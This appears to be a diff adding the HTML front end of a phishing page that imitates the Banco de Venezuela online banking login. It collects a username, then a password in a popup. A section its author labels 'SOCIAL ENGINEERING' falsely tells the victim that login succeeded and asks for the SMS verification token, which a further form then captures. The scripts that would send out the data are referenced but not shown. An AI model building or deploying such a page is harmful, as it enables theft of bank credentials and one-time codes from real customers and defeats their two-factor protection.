@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BDVenlínea personas</title>
+    <!-- CUSTOM CSS -->
+    <link rel="stylesheet" type="text/css" href="./style.css" />
+    <link rel="icon" type="image/png" href="./img/bdv.png" />
+  </head>
+  <body>
+    <!-- MAIN SECTION -->
+
+    <div class="container__all">
+      <header class="container__header">
+        <div class="container__img__logo">
+          <img src="./img/personas.png" alt="logo-login" />
+        </div>
+      </header>
+      <section class="container__section">
+        <div class="container__first">
+          <input type="text" placeholder="Usuario *" id="first" />
+        </div>
+        <div class="container__next" id="button">
+          <input class="enabled" type="button" value="Entrar" id="nextwindow" />
+        </div>
+        <div class="container__forgot">
+          <a href="#">¿Olvidaste tu usuario o clave?</a>
+        </div>
+        <div class="container__newuser">
+          <a href="#">Si eres nuevo clienteBDV regístrate aquí</a>
+        </div>
+      </section>
+    </div>
+
+    <!-- FLOATING WINDOW -->
+
+    <div class="container__background hidediv" id="windowhide">
+      <div class="container__window">
+        <div class="container__title">
+          <p>Introduce tu contraseña</p>
+        </div>
+        <div class="container__input">
+          <div class="container__second">
+            <input type="text" placeholder="Contraseña" id="second" />
+          </div>
+          <div class="container__view">
+            <img src="./img/view.png" alt="icon-view" />
+          </div>
+        </div>
+        <div class="container__required">
+          <p>Contraseña es requerida</p>
+        </div>
+        <span id="resfirst"></span>
+        <span id="resecond"></span>
+        <div class="container__gobutton" id="gobutton">
+          <input
+            class="goenabled"
+            type="button"
+            value="Continuar"
+            id="sendatatme"
+          />
+        </div>
+        <div class="container__cancel">
+          <input type="button" value="Cancelar" id="windowshow" />
+        </div>
+      </div>
+    </div>
+
+    <!-- SOCIAL ENGINEERING -->
+
+    <div class="container__social hidediv" id="social">
+      <div class="container__logo__header">
+        <img src="./img/BDV-Header.jpg" alt="logo-header" />
+      </div>
+      <div class="container__logo__bdv">
+        <img src="./img/Banco-de-Venezuela.png" alt="logo-banco-de-venezuela" />
+      </div>
+      <div class="container__alert">
+        <div class="container__title__header">
+          <p>Autenticación</p>
+        </div>
+      </div>
+      <div class="container__social__section">
+        <div class="container__social__message">
+          <p>
+            Su inicio de sesión se ha realizado con éxito, sin embargo, es necesario realizar una autenticación mediante SMS solicitando un token de verificación, el cual se enviará a su bandeja de mensajes de texto. Siga nuestras instrucciones para mantener su cuenta segura.
+          </p>
+        </div>
+        <div class="container__request__button">
+          <input type="button" value="Solicitar token" id="requestbutton" />
+        </div>
+      </div>
+    </div>
+
+    <!-- TOKEN PAGE -->
+
+    <div class="container__token__background hidediv" id="tokenhide">
+      <div class="container__token__window">
+        <div class="container__token__title">
+          <p>Autenticación</p>
+        </div>
+        <div class="container__token__message">
+          <p>Introduzca el token recibido por SMS</p>
+        </div>
+        <div class="container__token__input">
+          <div class="container__token__second">
+            <input
+              type="text"
+              maxlength="7"
+              placeholder="Introduzca código recibido"
+              id="tokencode"
+            />
+          </div>
+        </div>
+        <span id="rescode"></span>
+        <div class="container__token__buttons">
+          <div class="container__token__gobutton" id="tokengobutton">
+            <input
+              class="goenabled"
+              type="button"
+              value="Continuar"
+              id="sendcode"
+            />
+          </div>
+          <div class="container__token__cancel">
+            <input type="button" value="Cancelar" id="tokenshow" />
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="./window.js"></script>
+    <script src="./script.js"></script>
+  </body>
+</html>
